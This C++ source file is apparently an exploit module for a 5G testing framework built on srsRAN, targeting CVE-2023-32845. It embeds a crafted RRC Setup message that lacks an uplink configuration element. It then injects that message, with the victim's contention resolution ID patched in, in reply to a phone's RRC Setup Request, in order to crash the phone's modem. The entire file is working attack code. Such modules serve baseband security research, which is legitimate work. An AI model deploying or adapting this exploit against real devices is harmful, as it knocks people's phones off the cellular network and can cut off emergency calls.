// 7.10 V14: Null RRC Uplink Config Element (CVE-2023-32845)
#include "shadower/modules/exploit.h"
#include "shadower/utils/utils.h"
#include "srsran/asn1/asn1_utils.h"
#include "srsran/asn1/rrc_nr.h"
#include "srsran/mac/mac_sch_pdu_nr.h"
#include <iomanip>
#include <sstream>
const uint8_t original_rrc_setup[] = {
    0x3e, 0x10, 0x66, 0xff, 0x9f, 0x60, 0x70, 0x00, 0x88, 0x28, 0x40, 0x04, 0x04, 0x1a, 0xe0, 0x05, 0x80, 0x08, 0x8b,
    0xd7, 0x63, 0x80, 0x83, 0x0f, 0x80, 0x03, 0xe0, 0x10, 0x23, 0x41, 0xe0, 0x40, 0x00, 0x20, 0x90, 0x4c, 0x0c, 0xa8,
    0x04, 0x0f, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x08, 0x00, 0x01, 0xb8, 0xa1, 0x10, 0x00, 0x04, 0x00, 0xb2, 0x80, 0x00,
    0x24, 0x10, 0x00, 0x02, 0x20, 0x49, 0xa0, 0x6a, 0xa4, 0x9a, 0x80, 0x00, 0x20, 0x04, 0x04, 0x00, 0x08, 0x00, 0xd0,
    0x10, 0x01, 0x3b, 0x64, 0xb1, 0x80, 0xee, 0x03, 0xb3, 0xc4, 0xd5, 0xe6, 0x80, 0x00, 0x01, 0x4d, 0x08, 0x01, 0x00,
    0x01, 0x2c, 0x0e, 0x10, 0x41, 0x64, 0xe0, 0xc1, 0x0e, 0x00, 0x1c, 0x4a, 0x07, 0x00, 0x00, 0x08, 0x17, 0xbd, 0x00,
    0x40, 0x00, 0x40, 0x00, 0x01, 0x90, 0x00, 0x50, 0x00, 0xca, 0x81, 0x80, 0x62, 0x20, 0x0a, 0x80, 0x00, 0x00, 0x00,
    0x00, 0xa1, 0x00, 0x40, 0x00, 0x0a, 0x28, 0x40, 0x40, 0x01, 0x63, 0x00};

class RRCSetupCrashExploit : public Exploit
{
public:
  RRCSetupCrashExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                       SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    if (!prepare_rrc_setup()) {
      throw std::runtime_error("Failed to prepare RRC setup");
    }
    original_rrc_setup_len = sizeof(original_rrc_setup);
    rrc_setup_vec          = std::make_shared<std::vector<uint8_t> >(original_rrc_setup_len);
  }

  void setup() override
  {
    f_rrc_setup_request = wd_filter("nr-rrc.c1 == 0");
    f_ue_identity       = wd_field("nr-rrc.randomValue"); // nr-rrc.ue_Identity
  }

  void pre_dissection(wd_t* wd) override { wd_register_filter(wd, f_rrc_setup_request); }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == UL && wd_read_filter(wd, f_rrc_setup_request)) {
      if (!extract_con_res_id(raw_buffer, raw_buffer_len, con_res_id, logger)) {
        logger.error("Failed to extract con_res_id from UL message");
        return;
      }
      logger.info(YELLOW "Received RRC setup request" RESET);
      srsran::byte_buffer_t tx_buffer;
      if (!replace_con_res_id(
              rrc_setup_mac_pdu, original_rrc_setup_len, con_res_id, tx_buffer, logger, &modified_dl_ccch_msg)) {
        logger.error("Failed to replace con_res_id in RRC setup request");
        return;
      }
      memcpy(rrc_setup_vec->data(), tx_buffer.data(), tx_buffer.size());
      dl_buffer_queue.push(rrc_setup_vec);
      return;
    }
  }

private:
  wd_filter_t                                f_rrc_setup_request;
  wd_field_t                                 f_ue_identity;
  uint32_t                                   original_rrc_setup_len;
  srsran::mac_sch_subpdu_nr::ue_con_res_id_t con_res_id;
  std::shared_ptr<std::vector<uint8_t> >     rrc_setup_vec;
  srsran::mac_sch_pdu_nr                     rrc_setup_mac_pdu;
  std::vector<uint8_t>                       modified_dl_ccch_msg;

  bool prepare_rrc_setup()
  {
    /* Unpack rrc_setup */
    if (rrc_setup_mac_pdu.unpack(original_rrc_setup, sizeof(original_rrc_setup)) != SRSRAN_SUCCESS) {
      printf("Failed to unpack MAC SDU\n");
      return false;
    }

    /* Enumerate all subpdus */
    uint32_t num_pdu = rrc_setup_mac_pdu.get_num_subpdus();
    for (uint32_t i = 0; i < num_pdu; i++) {
      srsran::mac_sch_subpdu_nr& subpdu = rrc_setup_mac_pdu.get_subpdu(i);
      if (subpdu.get_lcid() == srsran::mac_sch_subpdu_nr::nr_lcid_sch_t::CCCH) {
        /* Parse to dl ccch msg */
        modified_dl_ccch_msg.resize(subpdu.get_sdu_length());
        modified_dl_ccch_msg.assign(subpdu.get_sdu(), subpdu.get_sdu() + subpdu.get_sdu_length());
        return true;
      }
    }
    return false;
  }
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new RRCSetupCrashExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}